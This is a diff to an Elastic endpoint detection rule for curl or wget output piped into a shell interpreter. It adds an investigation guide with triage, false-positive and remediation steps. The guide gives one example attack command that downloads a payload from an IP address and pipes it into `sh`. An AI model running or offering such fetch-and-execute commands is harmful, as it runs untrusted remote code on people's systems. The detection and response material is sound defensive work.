@@ -2,7 +2,7 @@
 creation_date = "2026/08/19"
 integration = ["endpoint"]
 maturity = "production"
-updated_date = "2026/08/19"
+updated_date = "2026/08/31"
 
 [rule]
 author = ["Elastic"]
@@ -16,6 +16,37 @@ index = ["logs-endpoint.events.process*"]
 language = "eql"
 license = "Elastic License v2"
 name = "File Downloaded by Curl/Wget and Piped to Interpreter"
+note = """ ## Triage and analysis
+
+> **Disclaimer**:
+> This investigation guide was created using generative AI technology and has been reviewed to improve its accuracy and relevance. While every effort has been made to ensure its quality, we recommend validating the content and adapting it to suit your specific environment and operational needs.
+
+### Investigating File Downloaded by Curl/Wget and Piped to Interpreter
+
+This rule identifies Linux activity where curl or wget retrieves content from a remote path and sends it directly to a shell or scripting interpreter, enabling code execution without first saving a conventional file. An attacker may run `curl http://203.0.113.10/payload | sh` to execute a staged payload and rapidly establish persistence or launch data theft.
+
+### Possible investigation steps
+
+- Reconstruct the complete process ancestry and descendants to identify the initiating user, access vector, executed commands, and any follow-on payloads.
+- Extract the remote URL, resolve redirects, assess domain and IP reputation, and safely retrieve the content for hashing, static analysis, and sandbox execution.
+- Correlate DNS, proxy, firewall, and endpoint network telemetry to confirm the connection, transferred bytes, related destinations, and other affected hosts.
+- Examine the host for persistence, dropped files, credential access, privilege escalation, account changes, or suspicious outbound connections occurring after the alert.
+- Confirm whether the activity was authorized by the user or system owner, and isolate the host, block indicators, and revoke exposed credentials if malicious intent is established.
+
+### False positive analysis
+
+- An administrator may use curl or wget to stream an approved installation or configuration script into a shell during deployment; verify the initiating account, change record, remote destination, and retrieved script contents.
+- An automated Linux provisioning or maintenance task may fetch and execute a trusted script through an interpreter; confirm the process ancestry, expected schedule, command line, destination ownership, and consistency across authorized hosts.
+
+### Response and remediation
+
+- Isolate the affected Linux host from the network while preserving volatile evidence, running processes, shell history, downloaded content, and relevant system logs.
+- Block the malicious URL, domain, IP address, and payload hashes across DNS, proxy, firewall, endpoint, and email controls, and identify other hosts that contacted the same infrastructure.
+- Terminate malicious processes and remove associated persistence from cron jobs, systemd units, shell profiles, startup scripts, SSH authorized keys, modified accounts, and files in locations such as `/tmp`, `/var/tmp`, and `/dev/shm`.
+- Escalate immediately to incident response if privileged execution, credential theft, lateral movement, data exfiltration, or the same indicators on multiple hosts are identified, and rotate affected passwords, keys, tokens, and secrets.
+- Reimage the system or restore it from a verified known-good image, validate package and configuration integrity, apply security updates, and monitor closely for renewed connections or execution.
+- Prevent recurrence by restricting outbound access, allowlisting approved download sources, limiting curl and wget use for service accounts, and alerting on streamed interpreter execution and executables launched from temporary or memory-backed paths.
+"""
 risk_score = 47
 rule_id = "3ebdc01e-7788-4845-8e7a-c8a671ad46ea"
 setup = """## Setup
@@ -51,7 +82,8 @@ tags = [
     "Tactic: Execution",
     "Tactic: Command and Control",
     "Tactic: Defense Evasion",
-    "Data Source: Elastic Defend"
+    "Data Source: Elastic Defend",
+    "Resources: Investigation Guide",
 ]
 type = "eql"
 query = '''
